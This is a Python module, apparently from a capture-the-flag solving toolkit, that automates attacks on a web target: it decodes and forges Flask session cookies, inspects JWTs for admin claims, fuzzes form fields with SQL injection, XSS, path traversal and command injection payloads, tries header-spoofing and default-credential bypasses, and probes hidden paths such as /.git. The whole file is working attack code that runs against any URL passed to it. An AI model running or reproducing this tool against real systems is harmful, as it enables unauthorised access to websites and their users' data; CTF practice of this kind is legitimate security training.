#!/usr/bin/env python3
"""
Burp Suite / Web Pentest Module for CTF
Handles: Request manipulation, cookie tampering, CSRF bypass, parameter fuzzing
"""
import os
import re
import json
import base64
import requests
from urllib.parse import urlparse, parse_qs
from core.colors import red, green, yellow, blue, highlight

FLAG_PATTERN = r'[a-zA-Z0-9_]+\{[^}]*\}'

class BurpSolver:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.found_flags = []
        self.cookies = {}
        self.csrf_token = None
    
    def extract_flag(self, text):
        if not text:
            return None
        flags = re.findall(FLAG_PATTERN, str(text))
        if flags:
            return flags[0]
        return None
    
    def decode_flask_cookie(self, cookie):
        """Decode Flask session cookie"""
        try:
            parts = cookie.split('.')
            if len(parts) >= 1:
                data_b64 = parts[0]
                data_b64 += '=' * (-len(data_b64) % 4)
                data = base64.b64decode(data_b64).decode('utf-8')
                return json.loads(data)
        except:
            pass
        return None
    
    def analyze_cookie(self):
        """Analyze and tamper with cookies"""
        print(f"{green('[+]')} Analyzing cookies...")
        
        for cookie_name, cookie_value in self.session.cookies.items():
            print(f"{yellow('[*]')} Cookie: {cookie_name} = {cookie_value[:50]}...")
            
            decoded = self.decode_flask_cookie(cookie_value)
            if decoded:
                print(f"{green('[+]')} Decoded Flask cookie: {json.dumps(decoded, indent=2)}")
                
                if 'admin' in decoded:
                    print(f"{yellow('[!]')} Found 'admin' field! Try setting to true")
                if 'user' in decoded:
                    print(f"{yellow('[!]')} Found 'user' field! Try changing values")
                if 'role' in decoded:
                    print(f"{yellow('[!]')} Found 'role' field! Try 'admin'")
                if 'csrf_token' in decoded:
                    self.csrf_token = decoded['csrf_token']
                    print(f"{green('[+]')} CSRF token found: {self.csrf_token}")
            
            if cookie_value.count('.') == 2 and len(cookie_value) > 50:
                print(f"{yellow('[*]')} Possible JWT token")
                try:
                    header = base64.b64decode(cookie_value.split('.')[0] + '==').decode()
                    payload = base64.b64decode(cookie_value.split('.')[1] + '==').decode()
                    print(f"{green('[+]')} JWT Header: {header}")
                    print(f"{green('[+]')} JWT Payload: {payload}")
                    
                    if 'admin' in payload.lower():
                        print(f"{yellow('[!]')} JWT has admin claim! Try to forge")
                except:
                    pass
    
    def tamper_cookie(self, cookie_name, modifications):
        """Attempt to tamper with cookie"""
        print(f"{green('[+]')} Attempting cookie tampering...")
        
        cookie_value = self.session.cookies.get(cookie_name, '')
        decoded = self.decode_flask_cookie(cookie_value)
        
        if decoded:
            for key, value in modifications.items():
                if key in decoded:
                    old = decoded[key]
                    decoded[key] = value
                    print(f"{yellow('[*]')} Changing {key} from {old} to {value}")
            
            new_data = base64.b64encode(json.dumps(decoded).encode()).decode().rstrip('=')
            parts = cookie_value.split('.')
            if len(parts) >= 3:
                new_cookie = f"{new_data}.{parts[1]}.{parts[2]}"
                print(f"{green('[+]')} Tampered cookie: {new_cookie[:50]}...")
                return {cookie_name: new_cookie}
        
        return None
    
    def fuzz_parameters(self, url, params):
        """Fuzz parameters with common payloads"""
        print(f"{green('[+]')} Fuzzing parameters...")
        
        payloads = [
            ("' OR '1'='1", "SQL Injection"),
            ("admin'--", "SQL Injection"),
            ("<script>alert(1)</script>", "XSS"),
            ("../../../etc/passwd", "Path Traversal"),
            ("1; ls", "Command Injection"),
            ("admin", "Admin bypass"),
            ("true", "Boolean bypass"),
            ("1", "Integer bypass")
        ]
        
        for payload, ptype in payloads:
            test_params = params.copy()
            for key in test_params:
                test_params[key] = payload
                
            try:
                r = self.session.get(url, params=test_params, timeout=3)
                if any(x in r.text.lower() for x in ['error', 'warning', 'sql', 'exception']):
                    print(f"{yellow('[!]')} {ptype} possible with parameter {key}={payload}")
                
                flag = self.extract_flag(r.text)
                if flag:
                    return flag
            except:
                pass
        
        return None
    
    def test_methods(self, url):
        """Test different HTTP methods"""
        print(f"{green('[+]')} Testing HTTP methods...")
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        
        for method in methods:
            try:
                if method == 'GET':
                    r = self.session.get(url)
                elif method == 'POST':
                    r = self.session.post(url)
                elif method == 'HEAD':
                    r = self.session.head(url)
                else:
                    r = self.session.request(method, url)
                
                print(f"{yellow('[*]')} {method}: {r.status_code}")
                
                flag = self.extract_flag(r.text)
                if flag:
                    return flag
                
                for header, value in r.headers.items():
                    flag = self.extract_flag(value)
                    if flag:
                        return flag
            except:
                pass
        
        return None
    
    def test_headers(self, url):
        """Test with modified headers"""
        print(f"{green('[+]')} Testing header modifications...")
        
        headers_list = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Forwarded-Proto': 'https'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
            {'Referer': 'https://admin.example.com'},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='}
        ]
        
        for headers in headers_list:
            try:
                r = self.session.get(url, headers=headers)
                flag = self.extract_flag(r.text)
                if flag:
                    print(f"{green('[+]')} Flag found with headers: {headers}")
                    return flag
            except:
                pass
        
        return None
    
    def solve(self):
        """Main Burp challenge solver"""
        print(f"{green('[+]')} Starting Burp/Web Pentest analysis on {self.target}")
        
        try:
            r = self.session.get(self.target)
            print(f"{green('[+]')} Initial response code: {r.status_code}")
            
            self.cookies = self.session.cookies.get_dict()
            
            flag = self.extract_flag(r.text)
            if flag:
                return flag
            
            self.analyze_cookie()
            
            forms = re.findall(r'<form.*?action=["\'](.*?)["\']', r.text)
            if forms:
                print(f"{green('[+]')} Found forms: {forms}")
                for form in forms:
                    form_url = self.target + form if form.startswith('/') else form
                    self.fuzz_parameters(form_url, {'username': 'test', 'password': 'test'})
            
            flag = self.test_methods(self.target)
            if flag:
                return flag
            
            flag = self.test_headers(self.target)
            if flag:
                return flag
            
            common_paths = ['/admin', '/flag', '/secret', '/hidden', '/backup', '/.git']
            for path in common_paths:
                url = self.target + path
                r = self.session.get(url)
                flag = self.extract_flag(r.text)
                if flag:
                    return flag
            
        except Exception as e:
            print(f"{yellow('[*]')} Error: {e}")
        
        return None


def run_burp(target):
    """Main Burp entry point"""
    solver = BurpSolver(target)
    return solver.solve()


if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        result = run_burp(sys.argv[1])
        if result:
            print(f"\n{red('[🏆]')} Flag found: {green(result)}")
        else:
            print(f"{yellow('[-]')} No flag found")